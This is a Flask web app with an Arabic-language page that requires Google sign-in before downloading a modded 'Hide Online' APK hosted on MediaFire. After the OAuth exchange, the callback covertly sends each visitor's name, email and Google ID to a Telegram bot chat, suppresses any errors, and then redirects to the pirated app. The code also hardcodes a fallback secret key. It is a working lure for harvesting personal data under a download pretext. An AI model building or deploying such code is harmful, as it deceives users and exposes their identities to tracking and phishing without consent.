import os
import requests
from flask import Flask, redirect, render_template_string, request, session, url_for

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")

GOOGLE_CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID")
GOOGLE_CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET")
REDIRECT_URI = "https://samer-production.up.railway.app/auth/callback"

MEDIAFIRE_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")


@app.route("/")
def home():
  return render_template_string("""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول بواسطة جوجل</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 20px; }
        .login-container { background: #fff; width: 100%; max-width: 420px; padding: 40px 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.1); display: flex; flex-direction: column; align-items: center; }
        h2 { margin-bottom: 30px; color: #1c1e21; font-size: 22px; text-align: center; font-weight: bold; }
        .google-btn { width: 100%; padding: 15px; background: #4285F4; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; text-decoration: none; gap: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
        .google-btn:hover { background: #357ae8; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>تسجيل الدخول للمتابعة وتحميل الملف</h2>
        <a href="/login" class="google-btn">
            <span>تسجيل الدخول باستخدام Google</span>
        </a>
    </div>
</body>
</html>
""")


@app.route("/login")
def login():
  google_auth_url = (
      f"https://accounts.google.com/o/oauth2/v2/auth?"
      f"client_id={GOOGLE_CLIENT_ID}&"
      f"redirect_uri={REDIRECT_URI}&"
      f"response_type=code&"
      f"scope=openid%20email%20profile"
  )
  return redirect(google_auth_url)


@app.route("/auth/callback")
def auth_callback():
  code = request.args.get("code")
  if not code:
    return "فشل المصادقة من جوجل", 400

  token_url = "https://oauth2.googleapis.com/token"
  token_data = {
      "code": code,
      "client_id": GOOGLE_CLIENT_ID,
      "client_secret": GOOGLE_CLIENT_SECRET,
      "redirect_uri": REDIRECT_URI,
      "grant_type": "authorization_code",
  }
  token_res = requests.post(token_url, data=token_data)
  token_json = token_res.json()
  access_token = token_json.get("access_token")

  if not access_token:
    return "فشل جلب رمز الوصول من جوجل", 400

  user_info_url = "https://www.googleapis.com/oauth2/v2/userinfo"
  headers = {"Authorization": f"Bearer {access_token}"}
  user_res = requests.get(user_info_url, headers=headers)
  user_info = user_res.json()

  email = user_info.get("email")
  name = user_info.get("name")
  google_id = user_info.get("id")

  if BOT_TOKEN and CHAT_ID:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": (
            f"🚨 تسجيل دخول جديد عبر Google:\n"
            f"👤 الاسم: {name}\n"
            f"📧 البريد: {email}\n"
            f"🆔 معرف جوجل: {google_id}"
        ),
        "parse_mode": "HTML",
    }
    try:
      requests.post(url, json=payload, timeout=5)
    except:
      pass

  return redirect(MEDIAFIRE_URL)


if __name__ == "__main__":
  port = int(os.environ.get("PORT", 5000))
  app.run(host="0.0.0.0", port=port)
